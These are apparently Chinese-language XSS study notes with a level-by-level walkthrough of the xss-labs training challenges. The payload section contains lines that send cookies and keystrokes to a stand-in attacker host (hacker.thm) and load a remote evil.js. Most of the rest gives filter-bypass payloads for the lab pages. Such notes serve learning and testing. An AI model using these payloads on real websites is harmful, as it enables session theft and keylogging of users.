# XSS 学习笔记
XSS，该漏洞被归类为注入攻击，恶意的 JavaScript代码 将被注入到 Web 应用程序中

## payloads
XSS的payload有两部分，用于 实现意图的部分 和 需要自行修改的部分 。

payload的“意图”部分是你希望 JavaScript代码 实际执行的操作（我们将在下面的一些示例中进行介绍），而payload的“修改”部分是指我们需要对代码进行更改以使其能够成功执行

**Proof Of Concept（POC-概念验证）：**通过在页面上弹出一个带有文本字符串的警告框

```javascript
<script>alert('XSS');</script>
```

**Session Stealing（会话窃取）：**下面的 JavaScript 能获取目标的 cookie，先通过 base64 编码 cookie 以确保其能成功传输，然后将其发布到黑客所控制的网站以进行记录。

```javascript
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
```

**Key Logger（键盘记录器）：**下面的js代码能充当键盘记录器。 这意味着你在网页上键入的任何内容都将被转发到黑客所控制的网站。

```javascript
<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
```

**Business Logic（业务逻辑）：**此处会调用特定的网络资源或 JavaScript 函数，例如，假设存在一个名为 user.changeEmail() 的用于更改用户电子邮件地址的 JavaScript 函数

```javascript
<script>user.changeEmail('attacker@hacker.thm');</script>
```

## <font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">反射型XSS</font>
<font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">当用户在 HTTP 请求中提供的数据未经任何验证就能被包含在网页源代码中时，就会发生反射型 XSS。</font>

<font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">注入?error=<script src="https://attavker.thm/evil.js"></script></font>

_**<font style="color:rgba(0, 0, 0, 0.75);background-color:rgb(235, 246, 255);"><script src></font>**_<font style="color:rgba(0, 0, 0, 0.8);background-color:rgb(235, 246, 255);"> 属性用于在 HTML 文档中引用外部 JavaScript 文件。</font>

![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1748488640105-4fd37602-3082-45c6-8eda-06917b76fcad.png)

注入点：

<font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">URL 查询字符串中的参数（Parameters ）</font>

<font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">URL 文件路径</font>

<font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">HTTP 标头（尽管在实践中不太可能存在XSS漏洞利用）</font>

## <font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">存储型XSS</font>
<font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">存储型XSS的payload能够存储在 Web 应用程序中（例如，将XSS payload存储在数据库中），然后在其他用户访问站点或网页时就能自动运行相关的XSS payload。</font>

## <font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">基于DOM的 XSS</font>
DOM 代表文档对象模型，是 HTML 和 XML 文档的应用程序编程接口，它代表的是一个页面，以便程序可以更改文档结构、样式和内容。

<font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">直接在浏览器中执行，而无需加载任何新页面或将数据提交给后端代码。当网站上的 JavaScript恶意代码 作用于输入或与用户发生交互时，该代码就会被执行。</font>

## <font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">Blind(盲注)XSS</font>
<font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">看不到相关的XSS payload是如何工作的或者你无法自行测试该XSS payload</font>

<font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">在测试 Blind XSS 漏洞时，你需要确保你的 XSS payload 有回调（通常是一个HTTP请求）；这样，你就能知道你的代码是否被执行以及何时被执行。</font>

<font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">工具： </font>xsshunter

## 实战（做题方法）
0.测试过滤

```javascript
" sRc DaTa OnFocus <sCriPt> <a hReF=javascript:alert()> &#106;
```

1.直接提交

```javascript
<script>alert('THM');</script>
```

![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1748492994518-4b276fbc-0753-497f-9c8d-5a7e9223cfba.png)

![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1748491129363-55804454-a352-4d1a-aaf2-cfb68bb2e632.png)

2.<font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">先对输入(input)标签进行闭合处理</font>

```javascript
"><script>alert('THM');</script>
```

![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1748492970994-1d7f1682-5319-4d4c-850a-4713c2069f85.png)

![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1748492040982-33f2831e-a15a-4daa-813b-245a87476e9a.png)

3.如果遇到</textarea>，需要先将其闭合

```javascript
</textarea><script>alert('THM');</script>
```

![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1748492950613-63c4f843-673a-4340-be96-b97eb6b2f933.png)

4.先对<font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">指定name的字段</font>进行闭合处理

```javascript
';alert('THM');//
```

![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1748493574900-c8a3015d-94cb-4a02-9a94-5f0886fdee30.png)

![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1748493585790-40913a6e-fa39-4026-9e86-55a5af8f5775.png)

5.当<script>会被过滤时，可以双写绕过

```javascript
<sscriptcript>alert('THM');</sscriptcript>
```

6.当<和>被过滤时，<font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">可以利用 IMG 标签的附加属性</font>

<font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">(1)例如 </font>_**<font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">onload</font>**_<font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);"> 事件（与img src连用）</font>

```javascript
/images/cat.jpg" onload="alert('THM');
```

![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1748511611648-ab652afa-2e2f-48ac-b2ad-6c3d3dcdaec1.png)

<font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">(2)</font><font style="color:rgb(77, 77, 77);">配合</font>**<font style="color:rgb(254, 44, 36);">onerror属性</font>**<font style="color:rgb(77, 77, 77);">，插入一个</font>**<font style="color:rgb(254, 44, 36);"><img></font>**<font style="color:rgb(77, 77, 77);">标签，闭合掉双引号跟括号，构造payload</font>

```javascript
"> <img src='666' onerror=alert()> <"
```

> <font style="color:rgb(79, 79, 79);background-color:rgb(238, 240, 244);">onerror属性是指当图片加载不出来的时候触发js函数，以上面的代码为例，这里因为src指向的是值666，而不是图片的地址和base64编码啥的，就会导致触发alert函数</font>
>

(3)其它img src相关构造

**<font style="color:rgb(254, 44, 36);">onmouseout</font>**

```javascript
"> <img src=666 onmouseout="alert()"> <"
```

**<font style="color:rgb(254, 44, 36);">onmouseover</font>**

```javascript
"> <img src=1 onmouseover="alert()"> <"
```

**<font style="color:rgb(254, 44, 36);">data:text/html;base64</font>**

```javascript
"> <iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgpPC9zY3JpcHQ+"> <"
```

<font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">7.Polyglots（多语言）:（通用）</font>

```javascript
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```

8.当<>被实体化时，通过 htmlspecialchars函数只针对<>大于小于号进行html实体化 

用onfocus事件，常与 <input>、<select> 和 <a> 标签一起使用

```javascript
" onfocus=javascript:alert(123) "
```

9.当过滤了js的标签还有onfocus事件，并且强制转换为小写时

![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1748538626611-f178a45d-e7ac-48f7-aaec-9559ec4b811f.png?x-oss-process=image%2Fformat%2Cwebp)

用**<font style="color:#fe2c24;">a href标签法</font>****(前为input标签)**

```javascript
"> <a href=javascript:alert()>xxx</a>
```

10.大小写绕过

```javascript
"><SCRIPT>alert('THM');</script>
```

11.<font style="color:rgb(51, 51, 51);background-color:rgb(250, 252, 253);">htmlspecialchars() 函数把一些预定义的字符转换为 HTML 实体。同时还</font><font style="color:rgb(77, 77, 77);">过滤掉了src、data、onfocus、href、script、"（双引号），以及大小写转换</font>

题目中含有href标签

![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1748886223884-8d029fcc-1429-4012-bbf2-06eda0c3bfe8.png)

# xss-labs
## level1
直接注入js代码即可

```javascript
?name=<script>alert('123');</script>
```

![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1748512521886-a996901c-8405-4cf2-a376-9195a1fd85a0.png)

## level2
直接提交会失败，查看源码后发现含有input标签，需要先闭合

![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1748535897878-bb41a25a-9d00-44fe-aad5-80c268ba01c2.png)

![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1748536409345-41dbaf76-1d6a-4aa7-8d4a-591131ab454c.png)

## level3
像上一关一样单引号闭合后会发现没有执行成功，增加了&lt; 和 &gt;奇怪的符号

![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1748536901009-d76e66c2-994f-47f6-9492-405e3af273be.png)

检索得知，符号被实体化了，即通过 htmlspecialchars函数只针对<>大于小于号进行html实体化 

**这里我们可以利用onfocus事件绕过**

![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1748537202592-d1fdfe5f-d25a-4b4c-a8d5-5c386cf766eb.png)

onfocus事件在元素获得焦点时触发，最常与 <input>、<select> 和 <a> 标签一起使用，以上面图片的html标签<input>为例，<input>标签是有输入框的，简单来说，onfocus事件就是当输入框被点击的时候，就会触发myFunction()函数，然后我们再配合javascript伪协议来执行javascript代码

所以，使用onfocus事件不需要用>闭合

```javascript
' onfocus=javascript:alert(123) '
```

![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1748537933040-306d2c46-0e3b-4229-913c-3fd9b77f9d5f.png)

## level4
先审计代码

![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1748538000449-ec75f886-8cba-4096-9d97-49d901c02d04.png)

尝试双引号闭合，发现过滤了<>

![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1748538105163-847ef29c-4d44-4286-8414-1be45047aafd.png)

继续用onfocus事件即可，用"闭合

```javascript
" onfocus=javascript:alert(123) "
```

![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1748538289918-cf951867-b42b-47bc-baa2-a009c337dff5.png)

## level5
这一关发现script被替换成了scr_ipt,用o_nfocus也是如此

![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1748538394119-5a31d56b-fa18-4daa-ad33-b738151921c3.png)

检索得知，通过以下三段代码限制了

![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1748538626611-f178a45d-e7ac-48f7-aaec-9559ec4b811f.png)

过滤了js的标签还有onfocus事件，虽然str_replace不区分大小写，但是有小写字母转化函数，所以就不能用大小写法来绕过过滤了，只能新找一个方法进行xss注入，这里我们用**<font style="color:#fe2c24;">a href标签法</font>**

![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1748538672459-cffad92c-304f-4f41-a195-f828cbb24fd7.png)

href属性的意思是 当标签<a>被点击的时候，就会触发执行转跳，上面是转跳到一个网站，我们还可以触发执行一段js代码

```javascript
"> <a href=javascript:alert()>xxx</a>
```

点击xxx即可过关

![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1748538872443-1a5f3ccb-f3b2-41ec-ad68-7fada6f7d178.png)

## level6
这关还是过滤了script

![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1748848503076-d8e4d5c0-b212-4dee-9f0c-878b3036b24f.png)

但是没有过滤大小写，直接用大写即可

```javascript
"><SCRIPT>alert('THM');</script>
```

![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1748848703378-ac33d457-a209-4eb7-b6cc-903dceb4da04.png)

## level7
这一关把括号里的script给删了

![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1748848882241-8a3b292e-8aa5-458a-8a75-dc4dccb40268.png)

双写绕过即可

```javascript
"><scrscriptipt>alert('thm');</scrscriptipt>
```

![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1748849288329-9985e175-623c-4393-866e-c96e0d4d6dff.png)

## level8
这一关有两个标签，<font style="color:rgb(77, 77, 77);">第一个是input标签，第二个是href属性</font>

![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1748884301195-8ac4870e-0f67-4548-8f25-4c10164e65b3.png)

测试发现<font style="color:rgb(77, 77, 77);">过滤掉了src、data、onfocus、href、script、"（双引号），添加了html实体转化函数</font>

![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1748885387646-8d7c8c18-a43c-4f11-8527-f169466addec.png)

<font style="color:rgb(77, 77, 77);">但是我们能利用href的隐藏属性自动Unicode解码，我们可以插入一段js伪协议</font>

```javascript
javascript:alert()
```

<font style="color:rgb(77, 77, 77);">利用在线工具进行Unicode编码后得到，</font>[在线Unicode编码解码 - 码工具](https://www.matools.com/code-convert-unicode)

```javascript
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#41;
```

点击友情标签即可

![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1748886262603-383b2d50-d565-4acc-b9c6-8281558b7733.png)

## level9
这关直接用上一关的方法会插入失败

![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1748886720161-a66a63a5-2b61-4cbd-bb99-5a179bfe69cc.png)

源码如下，要求传入的值必须有<font style="color:rgb(77, 77, 77);">http://</font>

![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1748886745200-41fa0229-7e64-4710-ba7a-8175c47f3b3f.png)

如

![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1748886856236-ba524bd0-37ed-468d-8cdf-7aa8fb7d6c0b.png)

<font style="color:rgb(77, 77, 77);">我们需要向传入的值里面添加</font><font style="color:rgb(254, 44, 36);">http://并用注释符注释掉否则会执行不了无法弹窗</font>

```javascript
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#41;/* http:// */
```

![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1748887046808-d7f165c4-9f1f-4d62-8959-0f44c9aacc34.png)

## level10
先看一下源码，发现有三个可以传参的地方

![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1748887591603-0170e0ff-e797-439f-a8b2-9990fe2c42d9.png)

分别测试三个传参，发现什么方法都不行

看完wp知道<font style="color:rgb(77, 77, 77);">这里过滤了<>，同时输入框被隐藏了，需要添加type="text"</font>

```javascript
?t_sort=" onfocus=javascript:alert() type="text
```

ok了

![](https://cdn.nlark.com/yuque/0/2025/png/54428404/1748888023026-40124942-7240-4396-b7f5-e75bede30def.png)

